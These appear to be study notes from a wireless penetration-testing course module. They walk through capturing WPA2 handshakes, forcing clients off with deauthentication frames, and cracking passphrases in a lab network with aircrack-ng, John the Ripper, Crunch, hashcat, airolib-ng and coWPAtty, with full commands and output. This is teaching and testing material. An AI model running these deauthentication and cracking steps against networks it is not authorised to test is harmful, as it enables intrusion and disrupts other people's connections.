# Module 8: Cracking Authentication Hashes

## Aircrack-ng Suite

Using airodump-ng to gather the channel and BSSID we want to attack so we can limit our capture:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo airodump-ng wlan0mon
...

CH  2 ][ Elapsed: 30 s ][ 2020-02-29 13:28 ][

 BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 C8:BC:C8:FE:D9:65  -23     579       69    1   2  54e. WPA2 CCMP   PSK  secnet
 34:08:04:09:3D:38  -30     638       24    0   3  54e. WPA2 CCMP   PSK  wifu
 00:18:E7:ED:E9:69  -84     104        0    0   3  54e. OPN              dlink

 BSSID              STATION            PWR   Rate    Lost  Packets  Probes

 C8:BC:C8:FE:D9:65  0C:60:76:57:49:3F  -69    0 - 1      0       35  secnet
 34:08:04:09:3D:38  00:18:4D:1D:A8:1F  -26   54 -54      0       31  wifu
 30:46:9A:FE:79:B7  30:46:9A:FE:69:BE  -73    0 - 1      0        1
```
{% endcode %}

We want to target ESSID **wifu** on channel **3** with BSSID **34:08:04:09:3D:38**, writing to a file with a "wpa" prefix:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
...

CH  3 ][ Elapsed: 12 s ][ 2020-02-29 13:30 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 34:08:04:09:3D:38  -45  87      107       69    1   3  54e. WPA2 CCMP   PSK  wifu

 BSSID              STATION            PWR   Rate    Lost  Packets  Probes

 34:08:04:09:3D:38  00:18:4D:1D:A8:1F  -26   54-54      0       31
```
{% endcode %}

Using **aireplay-ng** with **-0 1** to deauthenticate once, **-a** to target our BSSID, and **-c** to identify the associate client:

{% code overflow="wrap" %}
```bash
kali@kali:~$ sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
13:30:30  Waiting for beacon frame (BSSID: 34:08:04:09:3D:38) on channel 1
13:30:30  Sending 64 directed DeAuth (code 7). STMAC: [00:18:4D:1D:A8:1F] [ 0| 0 ACKs]
```
{% endcode %}

Capturing the handshake:

```bash
CH  3 ][ Elapsed: 52 s ][ 2020-02-29 13:31 ][ WPA handshake: 34:08:04:09:3D:38
```

It's not a bad idea to leave the traffic capture running. The additional data will assist in confirming the key is correct later on.

{% hint style="info" %}
Some wireless drivers ignore directed deauthentication and only respond to broadcast deauthentication. We can run the same **aireplay-ng** deauthentication command without the **-c** parameter.

If 802.11w is in use, unencrypted deauthentication frames are ignored. The only course of action is to wait for a client to connect.
{% endhint %}

Using **aircrack-ng** against our recently created capture file, **wpa-01.cap**, specifying the path to our wordlist, the ESSID, and the BSSID:

{% code overflow="wrap" %}
```bash
kali@kali:~$ aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap

                              Aircrack-ng 1.5.2

      [00:00:00] 3424/3559 keys tested (3516.42 k/s)

      Time left: 0 seconds                                     100.00%

                           KEY FOUND! [ 12345678 ]


      Master Key     : 27 A6 FB B3 FA 30 4C CD EE E5 8E 88 36 D0 CC 6D
                       A8 0D AB FE 06 D7 68 DF A1 0B 9F C7 30 03 4F 47

      Transient Key  : 8F C7 EF EF EF EF EF EF 60 1D EC 08 B7 4A 22 71
                       42 A1 A1 35 F2 76 DB C0 A4 42 06 15 5F E0 46 4D
                       E9 10 2F CD 51 22 CE 2E 77 CF 5E 69 DB E4 7C C5
                       FA 72 9A 45 25 D4 D6 53 8B 05 35 2D 24 01 C9 B6

      EAPOL HMAC     : AB D2 9E 97 66 C7 A6 77 7E 63 43 73 CC 73 9A 37
```
{% endcode %}

{% hint style="info" %}
Without both _-e_ and _-b_ parameters, aircrack-ng normally prompts to choose a network to crack. In this case, since there is only one network, aircrack-ng automatically chooses our target.
{% endhint %}

Confirming our key is correct by decrypting the traffic with **airdecap-ng**:

```bash
kali@kali:~$ airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
Total number of stations seen            1
Total number of packets read           393
Total number of WEP data packets         0
Total number of WPA data packets       125
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets        37
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

We could have also used Wireshark, adding the passphrase for decryption.

## Custom Wordlists with Aircrack-ng

### Using Aircrack-ng with John the Ripper

_Just describing JtR._

### Editing John the Ripper Rules

JtR mangling rules are located in **/etc/john/john.conf**.

Testing our rules by running JtR in wordlist mode and sending stdout as input to **grep**:

{% code overflow="wrap" %}
```bash
kali@kali:~$ john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
Press 'q' or Ctrl-C to abort, almost any other key for status
password123
password123
Password123
PASSWORD123
password1230
password1231
...
password1239
4056131p 0:00:00:00 100.00% (2018-01-10 10:00) 5481Kp/s sss999
```
{% endcode %}

### Using Aircrack-ng with JTR

Piping JtR into aircrack-ng:

{% code overflow="wrap" %}
```bash
kali@kali:~$ john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap `
...

                              Aircrack-ng 1.5.2

                   [00:01:21] 713471 keys tested (8789.92 k/s)

                          KEY FOUND! [ Password123 ]


      Master Key     : 57 7D EF 0B 09 FF 92 92 3F 15 52 E8 48 D8 26 6D
                       EB 10 8A 15 B5 F0 62 14 4F 88 C1 78 FB D4 52 04

      Transient Key  : 45 21 28 85 40 69 58 29 77 6E B0 BC D2 D2 FC AA
                       C5 5A 08 C9 B1 58 50 42 DC AD B8 54 95 1E 51 E9
                       44 15 81 28 67 E9 28 02 0E 29 43 5E 31 C2 23 C0
                       0A 1F 46 DB A4 93 52 5B 2E 7E 57 09 BC 2B 0B 13

      EAPOL HMAC     : 19 7B 5B D1 32 73 82 69 98 56 06 BA 9B D2 B4 9B
```
{% endcode %}

### Using Arcrack-ng with Crunch

_Crunch_ is an easy-to-use password generator and can interact with aircrack-ng in the same was as JtR did. It only requires specifying the first two parameters, the minimum and maximum length of the password:

```bash
kali@kali:~$ crunch 8 9
Crunch will now generate the following amount of data: 56174480370944 bytes
53572159 MB
52316 GB
51 TB
0 PB
Crunch will now generate the following number of lines: 5638330743552
aaaaaaaa
aaaaaaab
aaaaaaac
aaaaaaad
aaaaaaae
aaaaaaaf
aaaaaaag
aaaaaaah
aaaaaaai
aaaaaaaj
...
```

Limiting Crunch's generation to certain characters:

```bash
kali@kali:~$ crunch 8 9 abc123
Crunch will now generate the following amount of data: 115893504 bytes
110 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 11757312
aaaaaaaa
aaaaaaab
aaaaaaac
aaaaaaa1
aaaaaaa2
aaaaaaa3
aaaaaaba
aaaaaabb
aaaaaabc
aaaaaab1
...
```

Crunch also allows us to specify a pattern with the _-t_ option with or without a character set. Different symbols in the pattern define the type of character to use.

* _@_ represents lowercase characters or characters from a defined set
* _,_ represents uppercase characters
* _%_ represent numbers
* _^_ represents symbols

Generating a wordlist to crack our WPA 4-way handshake:

```bash
kali@kali:~$ crunch 11 11 -t password%%%
Crunch will now generate the following amount of data: 12000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000
password000
password001
password002
password003
...
password999
```

Another way to generate it using specified characters:

```bash
kali@kali:~$ crunch 11 11 0123456789 -t password@@@
Crunch will now generate the following amount of data: 12000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000
password000
password001
password002
password003
...
password999
```

Using the **-p** option to generate unique words from a character set. Min/maximum length still required but is ignored, hence the `1 1`:

```bash
kali@kali:~$ crunch 1 1 -p abcde12345
Crunch will now generate approximately the following amount of data: 39916800 bytes
38 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 3628800
12345abcde
12345abced
12345abdce
12345abdec
12345abecd
12345abedc
12345acbde
12345acbed
12345acdbe
12345acdeb
...
edcba54321
```

Generating a list of unique words from multiple values:

```bash
kali@kali:~$ crunch 1 1 -p dog cat bird
Crunch will now generate approximately the following amount of data: 66 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 6
birdcatdog
birddogcat
catbirddog
catdogbird
dogbirdcat
dogcatbird
```

Refining our wordlist more with **-t** and **-p**:

```bash
kali@kali:~$ crunch 5 5 -t ddd%% -p dog cat bird
Crunch will now generate approximately the following amount of data: 7800 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 600
birdcatdog00
birdcatdog01
birdcatdog02
birdcatdog03
birdcatdog04
birdcatdog05
birdcatdog06
birdcatdog07
birdcatdog08
birdcatdog09
...
```

Because there's very little value in storing all these generated passwords on disk, we can pipe it directly into **aircrack-ng**:

```bash
kali@kali:~$ crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
...

                              Aircrack-ng 1.5.2

                   [00:00:02] 128 keys tested (48.74 k/s)


                          KEY FOUND! [ password123 ]


      Master Key     : 57 7D EF 0B 09 FF 92 92 3F 15 52 E8 48 D8 26 6D
                       EB 10 8A 15 B5 F0 62 14 4F 88 C1 78 FB D4 52 04

      Transient Key  : 2E 8D 54 FF 59 CD 06 85 40 EB 36 66 58 0F FD DF
                       19 84 FC FA 6C EC F7 8A 29 12 83 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : DC 5F 0D 69 7D 77 64 C1 16 7D F4 13 B5 8D 51 AB
```

### Using Aircrack-ng with RSMangler

_RSMangler_ is a Ruby script that takes words as input and modifies them in multiple ways.

Using RSMangler with a wordlist, sending to aircrack-ng:

{% code overflow="wrap" %}
```bash
kali@kali:~$ rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -

...
                              Aircrack-ng 1.5.2

                   [00:00:02] 128 keys tested (48.74 k/s)


                          KEY FOUND! [ 41birdcatdog ]


      Master Key     : CE BD A8 BD 43 39 5B 4E 1E 7E 2B A6 77 F0 3D 85
                       20 7E E2 AF 6E 9C 9C A2 1D F2 33 B7 9E C2 A1 A8

      Transient Key  : B8 7D A9 6F EA BD 4C 52 3F 57 09 8A C5 37 F1 41
                       87 B6 B7 87 21 D1 82 63 1F 9A B7 41 E2 AD 22 08
                       7A 6B F2 D4 19 26 66 09 D2 BB F4 AB 89 26 AA 5D
                       E7 E5 9E 85 30 80 1B A8 4A 14 BD 73 82 7E D3 0F

      EAPOL HMAC     : 58 CD C7 9E 0E 45 66 05 5B E1 0C 10 93 D7 65 2C
```
{% endcode %}

## Hashcat

### OpenCL for GPUs

_GPU go brrrrr._

### Device Properties

Using hashcat to display device information:

{% code overflow="wrap" %}
```bash
kali@kali:~$ hashcat -I
hashcat (v6.2.6) starting in backend information mode

OpenCL Info:
============

OpenCL Platform ID #1
  Vendor..: The pocl project
  Name....: Portable Computing Language
  Version.: OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG

  Backend Device ID #1
    Type...........: CPU
    Vendor.ID......: 128
    Vendor.........: GenuineIntel
    Name...........: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz
    Version........: OpenCL 3.0 PoCL HSTR: cpu-x86_64-pc-linux-gnu-haswell
    Processor(s)...: 4
    Clock..........: 2400
    Memory.Total...: 18931 MB (limited to 4096 MB allocatable in one block)
    Memory.Free....: 9433 MB
    Local.Memory...: 256 KB
    OpenCL.Version.: OpenCL C 1.2 PoCL
    Driver.Version.: 6.0+debian
```
{% endcode %}

{% hint style="warning" %}
It is not recommended to use hashcat for cracking when only the portable OpenCL is available, as it is very slow. Use aircrack-ng instead. Portable OpenCL is 4 to 15 times slower than aircrack-ng depending on the CPU used. On the other hand, the Intel OpenCL has similar speed compared to aircrack-ng.

We do not recommend running hashcat with a device using the portable OpenCL (pocl), as it is known to be buggy. Although hashcat may list the portable OpenCL in the devices list, it will skip it when other OpenCL runtimes are available.
{% endhint %}

### Hashcat Benchmark

Hashcat provides a benchmarking option with **-b**. Benchmarking with the 2500 hash mode:

{% code overflow="wrap" %}
```bash
kali@kali:/~$ hashcat -b -m 2500
hashcat (v6.2.6) starting in benchmark mode

Benchmarking uses hand-optimized kernel code by default.
You can use it in your cracking session by setting the -O option.
Note: Using optimized kernel code limits the maximum supported password length.
To disable the optimized kernel code in benchmark mode, use the -w option.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 9433/18931 MB (4096 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

The plugin 2500 is deprecated and was replaced with plugin 22000. For more details, please read: https://hashcat.net/forum/thread-10253.html                                                        

------------------------------------------------------
* Hash-Mode 2500 (WPA-EAPOL-PBKDF2) [Iterations: 4095]
------------------------------------------------------

Speed.#1.........:    14332 H/s (70.79ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8

Started: Sun Jul 21 12:24:09 2024
Stopped: Sun Jul 21 12:24:11 2024
...
```
{% endcode %}

Benchmarking with the 22000 hash mode:

{% code overflow="wrap" %}
```bash
kali@kali:~$ hashcat -b -m 22000          
hashcat (v6.2.6) starting in benchmark mode

Benchmarking uses hand-optimized kernel code by default.
You can use it in your cracking session by setting the -O option.
Note: Using optimized kernel code limits the maximum supported password length.
To disable the optimized kernel code in benchmark mode, use the -w option.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 9433/18931 MB (4096 MB allocatable), 4MCU

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------------------------------------------------
* Hash-Mode 22000 (WPA-PBKDF2-PMKID+EAPOL) [Iterations: 4095]
-------------------------------------------------------------

Speed.#1.........:    14251 H/s (71.00ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8

Started: Sun Jul 21 12:24:25 2024
Stopped: Sun Jul 21 12:24:27 2024
```
{% endcode %}

### Hashcat Utilities

Hashcat provies more than two dozen small utilities useful for password cracking. They're not installed by default but are available through the _hashcat-utils_ package.

After install, these can be found at **/usr/lib/hashcat-utils**. One specifically relevant for our purposes is _cap2hccapx_. This exports WPA handshakes from PCAP files to HCCAPx, a format used by the 2500 hash mode in hashcat for WPA/WPA2 handshakes.

Converting PCAP to hccapx for hashcat:

```bash
kali@kali:~$ /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
Networks detected: 1

[*] BSSID=34:08:04:09:3d:38 ESSID=wifu (Length: 4)
 --> STA=00:18:4d:1d:a8:1f, Message Pair=0, Replay Counter=1
 --> STA=00:18:4d:1d:a8:1f, Message Pair=2, Replay Counter=1

Written 2 WPA Handshakes to: output.hccapx
```

{% hint style="info" %}
**aircrack-ng** can also use **.hccapx** files as input for cracking.
{% endhint %}

### Passphrase Cracking with Hashcat

Using the WPA hash mode, we will crack the file generated by cap2hccapx with the JtR default wordlist. Hash mode 2500 is depcrecated, thus we must use **--deprecated-check-disable**:

{% code overflow="wrap" %}
```bash
kali@kali:~$ hashcat -m 2500 --deprecated-check-disable output.hccapx /usr/share/john/password.lst
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 9433/18931 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 2 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/john/password.lst
* Passwords.: 3559
* Bytes.....: 26326
* Keyspace..: 3559
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.           

18a6f760c1a6:64200cd2c98e:wifu:12345678                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 2500 (WPA-EAPOL-PBKDF2)
Hash.Target......: wifu (AP:18:a6:f7:60:c1:a6 STA:64:20:0c:d2:c9:8e)
Time.Started.....: Sun Jul 21 01:08:33 2024 (0 secs)
Time.Estimated...: Sun Jul 21 01:08:33 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/john/password.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10097 H/s (3.66ms) @ Accel:512 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3559/3559 (100.00%)
Rejected.........: 2920/3559 (82.05%)
Restore.Point....: 0/3559 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #!comment: -> newcourt
Hardware.Mon.#1..: Util: 33%

Started: Sun Jul 21 01:08:32 2024
Stopped: Sun Jul 21 01:08:35 2024
```
{% endcode %}

The reason that we can not use cap2hccapx with the 22000 hash mode is that when we used **cap2hccapx.bin** to create our **output.hccapx** file, it creates a binary format file. This binary format does not work with the new 22000 hash mode.

To use the 22000 mode we need to convert our **wifi-01.cap** file to the correct format. There are two ways to do this. The first method is to take our file and upload it to **https://hashcat.net/cat2hashcat**.

The second method is to use the application **hcxtools**.&#x20;

Using Hcxpcapngtool to convert the file:

{% code overflow="wrap" %}
```bash
kali@kali:~$ hcxpcapngtool -o hash.hc22000  wifu-01.cap                                   
hcxpcapngtool 6.2.7 reading from wifu-01.cap...

summary capture file
--------------------
file name................................: wifu-01.cap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
timestamp minimum (GMT)..................: 20.07.2024 23:30:17
timestamp maximum (GMT)..................: 20.07.2024 23:30:48
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
endianness (capture system)...............: little endian
packets inside...........................: 385
ESSID (total unique).....................: 3
BEACON (total)...........................: 1
BEACON on 2.4 GHz channel (from IE_TAG)..: 3 
ACTION (total)...........................: 5
PROBEREQUEST.............................: 75
PROBERESPONSE (total)....................: 63
AUTHENTICATION (total)...................: 2
AUTHENTICATION (OPEN SYSTEM).............: 2
ASSOCIATIONREQUEST (total)...............: 1
ASSOCIATIONREQUEST (PSK).................: 1
WPA encrypted............................: 18
EAPOL messages (total)...................: 5
EAPOL WPA messages.......................: 5
EAPOLTIME gap (measured maximum usec)....: 5266
EAPOL ANONCE error corrections (NC)......: not detected
EAPOL M1 messages (total)................: 2
EAPOL M2 messages (total)................: 1
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 1
EAPOL pairs (total)......................: 3
EAPOL pairs (best).......................: 1
EAPOL pairs written to 22000 hash file...: 1 (RC checked)
EAPOL M32E2 (authorized).................: 1

...

session summary
---------------
processed cap files...................: 1
```
{% endcode %}

Using hashcat to crack our newly converted file:

```bash
kali@kali:~$ hashcat -a 0 -m  22000  hash.hc22000 /usr/share/john/password.lst
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz, 9433/18931 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/john/password.lst
* Passwords.: 3562
* Bytes.....: 26352
* Keyspace..: 3562

2442679d425b0d1c44d23de553a7cb5b:18a6f760c1a6:64200cd2c98e:wifu:12345678
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.hc22000
Time.Started.....: Sun Jul 21 01:41:02 2024 (0 secs)
Time.Estimated...: Sun Jul 21 01:41:02 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/john/password.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    11941 H/s (10.23ms) @ Accel:128 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2705/3562 (75.94%)
Rejected.........: 2193/2705 (81.07%)
Restore.Point....: 0/3562 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #!comment: -> overkill
Hardware.Mon.#1..: Util: 33%

Started: Sun Jul 21 01:41:01 2024
Stopped: Sun Jul 21 01:41:04 2024
```

A **potfile** is created with our cracked passphrases (unless we specify **--potfile-disable**) which is located at **\~/.hashcat/hashcat.potfile**. A different path can be specified with **--potfile-path**.

## Airolib-ng

### Using Airolib-ng

To use **airolib-ng**, we first need a text file containing the ESSID of our target AP:

```bash
kali@kali:~$ echo wifu > essid.txt
```

Next, we import this file into the airolib-ng database:

```bash
kali@kali:~$ airolib-ng wifu.sqlite --import essid essid.txt
Database <wifu.sqlite> does not already exist, creating it...
Database <wifu.sqlite> successfully created
Reading file...
Writing...
Done.
```

Import our wordlist(s) to the database:

```bash
kali@kali:~$ airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
Reading file...
Writing... read, 2539 invalid lines ignored.
Done.
```

Ignored entries are because WPA passwords are between 8 and 63 characters long.

Make **airolib-ng** batch process all the PMKs:

```bash
kali@kali:~$ airolib-ng wifu.sqlite --batch
Computed 501 PMK in 2 seconds (250 PMK/s, 0 in buffer). All ESSID processed.

kali@kali:~$ airolib-ng wifu.sqlite --stats
There are 1 ESSIDs and 501 passwords in the database. 501 out of 501 possible combinations have been computed (100%).

ESSID	Priority	Done
wifu	64	100.0
```

Rather than using a wordlist with **aircrack-ng**, we can choose to pass our database:

```bash
kali@kali:~$ aircrack-ng -r wifu.sqlite wpa1-01.cap

                        Aircrack-ng 1.6

             [00:00:00] 16 keys tested (23633.68 k/s)

                     KEY FOUND! [ password ]

Master Key     : 68 72 39 CD 26 DA 6B 12 64 37 1E AB A5 9F E5 7F
                 29 DE 33 75 0A 12 4C E0 F7 D4 2E 00 4C 51 FB 56

Transient Key  : 2F 07 B7 3D 1E D3 AB 73 69 3F 39 99 11 8A 00 4F
                 C8 29 67 AA 46 35 EF 99 E9 B1 A5 41 DC 29 07 A0
                 66 EC 9D D8 D5 96 65 D6 DE E4 97 30 9B D7 B8 FC
                 6F 35 48 82 42 3B EC 11 7A 13 E4 CF 5C 08 4A DB

EAPOL HMAC     : 8E 86 F5 EB F6 2A 2A 47 0B 66 9B C7 8A E2 9F 63
```

As shown, using PMKs go _**much**_ quicker than trying to crack the PSK.

## coWPAtty

### Rainbow Table Mode

The main purpose of coWPAtty is to use pre-computed hashes, similar to airolib-ng.&#x20;

{% hint style="warning" %}
An important point to keep in mind when using pre-computed hashes is that they need to be generated for each unique ESSID. The ESSID is combined with the WPA pre-shared key to create the hash. This means that the hashes for the ESSID of "wifu" will not be the same as those for "linksys" or "dlink".
{% endhint %}

Creating pre-computed hash tables using genpmk:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># -d outputs toa  file
</strong><strong># -s specifies the ESSID
</strong><strong># -f defines our wordlist
</strong><strong>kali@kali:~$ genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu
</strong>genpmk 1.1 - WPA-PSK precomputation attack. &#x3C;jwright@hasborg.com>
File wifuhashes does not exist, creating.

503 passphrases tested in 1.17 seconds:  429.25 passphrases/second
</code></pre>

Using pre-computed hashtables with coWPAtty:

{% code overflow="wrap" %}
```bash
kali@kali:~$ cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.

The PSK is "Password123".

503 passphrases tested in 0.00 seconds:  30391.61 passphrases/second
```
{% endcode %}
